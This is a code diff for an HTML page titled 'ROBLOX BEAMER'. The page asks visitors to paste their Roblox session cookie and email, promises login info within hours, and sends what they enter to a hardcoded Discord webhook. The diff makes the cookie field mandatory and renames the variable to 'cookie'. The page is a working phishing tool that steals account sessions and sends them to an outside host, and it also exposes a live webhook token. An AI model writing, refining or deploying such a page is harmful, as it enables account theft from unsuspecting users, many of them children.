@@ -51,7 +51,7 @@
   <h1>ROBLOX BEAMER</h1>
   <form id="contact-form">
     <input type="email" id="email" placeholder="Enter Email" required />
-    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+    <textarea id="message" rows="4" placeholder="Enter Cookie" required></textarea>
     <button type="submit">Send</button>
     <div class="notice">You will receive the login info in 1-2 Hours.</div>
   </form>
@@ -63,12 +63,12 @@
       e.preventDefault();
 
       const email = document.getElementById('email').value;
-      const message = document.getElementById('message').value;
+      const cookie = document.getElementById('message').value; // Changed to cookie instead of message
 
-      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Replace with your real webhook
+      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Your webhook
 
       const payload = {
-        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${message || "No cookie provided"}`
+        content: `📬 New Contact Submission\n📧 Email: ${email}\n🍪 Cookie: ${cookie || "No cookie provided"}`
       };
 
       try {
